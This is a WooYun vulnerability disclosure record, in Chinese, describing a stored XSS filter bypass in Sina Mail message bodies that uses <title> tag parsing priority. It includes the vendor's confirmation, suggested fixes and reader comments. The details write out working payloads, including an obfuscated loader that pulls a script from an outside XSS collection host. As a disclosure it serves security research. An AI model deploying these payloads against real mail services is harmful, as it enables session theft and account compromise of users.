{"id": 13378, "wybug_id": "wooyun-2013-019578", "wybug_title": "新浪邮箱邮件正文XSS - 富文本过滤策略绕过", "wybug_corp": "新浪", "wybug_author": "gainover", "wybug_date": "2013-03-05 18:05", "wybug_open_date": "2013-04-19 18:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-19：\t细节向公众公开  简要描述： 其实一直捏着一个新浪邮箱的XSS。。。 然后，今天下午本来想发出来。。。可是。。可是。。。 再测试时候，竟然被修复了，吐血三升。于是只好现找现卖了，现找现卖啊！亲！经过研究，发现富文本过滤器的一处缺陷，可以成功绕过执行XSS，通杀所有浏览器。 详细说明：  1. 首先做一些基本的测试。<img onerror=\"\">  --> 过滤<img ononerrorerror=\"\">  --> 不过滤<img onerror>  --> 也不过滤说明不是简单的依据关键词来过滤的。2. 那么下面这样应该也不会过滤。<img a=\"onerror=alert(1)//\">\n\n3. 接着我们尝试利用<title></title> 标签对的优先解析来试试。\n<title><img a=\"</title><img/src=1 onerror=alert(1)//\">\n方便新手看懂，说下原理。过滤器会解析为。\n\n而浏览器则会先解析title\n\n4. 可以看到，IE下，代码被成功执行啦！\n\n5. 接着我们调用xsser.me的代码.\n<title><img a=\"</title><img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,53,78,83,55,97,99);document.body.appendChild(window.s)})()//>\">\n可以看到打开邮件后，被浏览器解析的代码。\n\nxsser.me中可以看到代码被成功执行。\n\n   漏洞证明：  见详细说明。   修复方案：  这个，不清楚后台过滤代码是怎么样的。1. <title> 这种标签，邮件里应该不常用，可以直接过滤掉？2. 或者如果不直接过滤掉，优先将<title> .. </title> <textarea> ..</textarea>等这种具有优先解析的标签对先取出来，再对剩下的内容做替换? = = 这个得你们自己多考虑了。我这个是个笨方法。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-03-05 18:16 厂商回复： 多谢gainover,已经安排人员进行处理了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-05 18:06 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  有企鹅邮箱的吗?洞主    \n     2013-03-05 18:45 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  二哥碉堡了    \n     2013-03-05 19:15 |    \t\tlsh4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:14        | 不是黑客!但是黑客手段都要会?)\t\t \n  二哥V5    \n     2013-03-05 19:50 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  87    \n     2013-03-26 10:53 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  啥内容页没有啊~    \n     2013-04-04 21:27 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  2哥威武    \n     2013-04-22 11:59 |    \t\tisno \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | test)\t\t \n  先学习学习    \n     2013-05-24 19:47 |    \t\t寸芒 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 小菜鸟，无意逆天……)\t\t \n  @Michael_113    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}